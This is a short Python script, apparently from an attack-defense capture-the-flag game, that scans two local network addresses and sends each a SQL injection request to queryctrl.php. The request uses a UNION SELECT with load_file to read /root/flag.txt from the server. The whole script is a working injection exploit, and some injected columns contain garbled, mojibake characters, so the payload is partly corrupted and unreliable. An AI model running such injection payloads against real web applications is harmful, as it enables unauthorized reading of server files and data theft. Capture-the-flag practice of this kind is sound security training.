import requests
for i in range(129,131):
	try:
		ip="http://192.168.1."+str(i)+"/queryctrl.php?username=z%' and 1=2 union select 1,load_file('/root/flag.txt'),区块链式随机,�ļ�����ļ�,5%23"
		re=requests.get(ip,timeout=0.1)
		print i,re.text
	except:
		print i,'con down'

